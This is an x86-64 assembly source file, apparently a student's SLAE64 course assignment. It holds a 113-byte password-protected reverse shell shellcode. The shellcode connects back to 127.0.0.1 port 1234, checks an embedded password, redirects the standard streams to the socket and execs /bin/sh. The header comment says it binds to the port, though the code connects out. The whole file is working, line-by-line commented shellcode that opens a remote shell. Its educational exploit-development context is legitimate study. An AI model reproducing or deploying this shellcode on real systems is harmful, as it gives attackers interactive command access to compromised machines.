; Andrea Bruna SLAE64 - 1493
; Assignment 2 - password protected reverse shell  
; Shellcode length 113 bytes 
; 
; Bind to port 1234
; Password = "andbruna" 

global _start

section .text

_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall = 41

	xor rsi,rsi ; rsi = 0
	mul rsi ; eax and rdx = 0
	push 2
	pop rdi ; rdi = 2
	inc esi ; rsi = 1
	mov al,41 
	syscall ; rax contains "sock"

	; server.sin_family = AF_INET = 2 (word)
	; server.sin_port = htons(1234) = 0xd204 (word)
	; server.sin_addr = inet_addr('127.0.0.1') (dword)
	; 8 empty bytes (1 qword)
	
	xchg rdi,rax ; sock in rdi
	push rdx ; push 0x0000000000000000
	push rax ; push 0x0000000000000000 again
	mov word [rsp+2],0xd204
	mov byte [rsp+4], 0x7f
	mov byte [rsp+7], 0x01
	; final second qword is 0x0100007fd2040002


	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	
	push rsp 
	pop rsi ; load in rsi the address of server struct in memory
	mov dl,16 ; length of struct in edx
	mov al,42 
	syscall

	; n = read(sock, buffer, 8)
	; syscall 0

	xor rax,rax ; clear rax
	cdq ; clear rdx too
	push rax ; make space for the buffer in the stack
	push rsp
	pop rsi ; and load its address in rsi
	mov dl,8 ; length of buffer (8 bytes) in rdx
	syscall	
	

	push rdi ; save sock
	push rsi ; save buffer addr
	; password check. Roughly equivalent to a strcmp except the fixed length (8 bytes)
	; and ignoring the lack of string terminators '\0'
	mov rax,0x616e757262646e61 ; load the password as hexadecimal in "reverse" order
				   ; for a low endian arch 
	pop rdi ; load the "buffer" address to be compared in rdi
	scasq ; compare the string read with the embedded password
	jnz _exit ; if they don't match jump to _exit	

	; redirect output	 
	; i = 3; while (i != 0) { --i; dup2(newsock, i); } 
	; syscall = 33

	pop rdi ; restore sock in rdi 
	xor rax,rax ; rax = 0
	push 3
	pop rsi ; i = 3 
loop_dup2:
	mov al,33 
	dec esi ; --i
	syscall
	jne loop_dup2 

	; char *arguments[] = { "/bin/sh", 0};
	; execve(arguments[0], 0, 0)
	; syscall 59
	
	push rsi ; terminates "/bin//sh" string with 0
	mov rbx,0x68732f2f6e69622f 
	push rbx ; command string pushed in reverse order for a low endian arch	
	push rsp 
	pop rdi ; rdi = &arguments[0]
	imul rsi ; rsi, rax and rdx = 0
	mov al,59
	syscall

_exit:

	; exit(any_value) 
	; syscall = 60
	; Not vital. Avoid segfaults if the strings comparison fails \ 
	; or the connection fails for any reason.
	; Comment if reducing shellcode size is more important than being "stealth" or "nice" to the OS :)
	
	push 60 ; rax bits between 63 and 8 might be set if jumping here after failing the scasq comparison  
	pop rax ; instead I don't care about the return addr (the value in rdi)
	syscall	; exit gracefully

